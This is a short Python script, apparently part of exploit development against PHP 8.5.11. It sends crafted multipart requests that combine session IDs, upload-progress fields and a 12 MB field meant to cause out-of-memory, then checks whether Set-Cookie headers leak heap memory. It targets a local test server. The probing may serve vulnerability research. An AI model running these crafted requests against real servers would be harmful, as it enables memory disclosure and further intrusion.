#!/usr/bin/env python3
"""Investigate 8.5.11 session-cookie behavior: which requests set a Set-Cookie, and does any leak heap?"""
import os
import sys, re
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart

t = Target("http://127.0.0.1:18114/index.php", timeout=60.0, verbose=False)

def check(label, parts, boundary):
    body = build_multipart(parts, boundary)
    resp = t.post(body, boundary, read_cap=1<<20)
    head, _, b = resp.partition(b"\r\n\r\n")
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    cookie = m.group(1) if m else None
    clen = len(cookie) if cookie else 0
    # is it a heap leak? (long, non-hex)
    leak = clen > 64
    print(f"{label}: Set-Cookie={'YES len='+str(clen)+(' [LEAK]' if leak else '') if cookie else 'no'}  body={b[:80]!r}")

# 1) plain: session id + upload progress, few fields
check("A: SID+pwn+3fields", [
    {"name":"PHPSESSID","data":b"attacksessionid0001"},
    {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
    {"name":"a","data":b"x"},{"name":"b","data":b"y"},{"name":"c","data":b"z"},
], b"B"*10)

# 2) valid 26-hex session id + upload progress
check("B: hex26+pwn+3fields", [
    {"name":"PHPSESSID","data":b"0123456789abcdef0123456789ab"},
    {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
    {"name":"a","data":b"x"},{"name":"b","data":b"y"},{"name":"c","data":b"z"},
], b"B"*10)

# 3) upload progress only (no explicit session id)
check("C: pwn only+file", [
    {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
    {"name":"f","filename":"a.txt","data":b"A"*64},
], b"B"*10)

# 4) big field + upload progress (OOM) + session id
import struct
check("D: OOM+SID+pwn", [
    {"name":"PHPSESSID","data":b"attacksessionid0001"},
    {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
    {"name":"big","data":b"B"*(12*1024*1024)},
], b"S"*17)
